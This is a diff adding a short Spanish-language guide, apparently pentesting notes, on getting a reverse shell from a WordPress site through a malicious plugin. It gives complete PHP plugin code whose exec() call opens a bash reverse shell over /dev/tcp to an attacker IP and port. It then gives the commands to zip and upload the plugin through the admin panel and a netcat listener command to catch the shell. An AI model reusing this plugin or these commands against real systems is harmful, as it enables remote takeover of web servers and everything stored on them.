@@ -1,0 +1,24 @@
+1- Creamos un archivo .php
+2- copiamos el siguiente código:
+
+
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/1234 0>&1'"); # Aquí ponemos la IP de la maquina atacante en escucha y el puerto
+?>
+
+
+3- Transformamos el .php a .zip: --> zip archivo.zip ./archivo.php
+4- Corroboramos que se creo el archivo .zip
+5- vamos al panel de administrador de WordPress --> Plugins --> agregar nuevo --> subimos nuestro plugin .zip 
+6- ponemos a la escucha a nuestra PC atacante: --> nc -lvnp 1234 (puerto que pusimos en el script)
+7- --> activamos el plugin y tenemos la rever shell
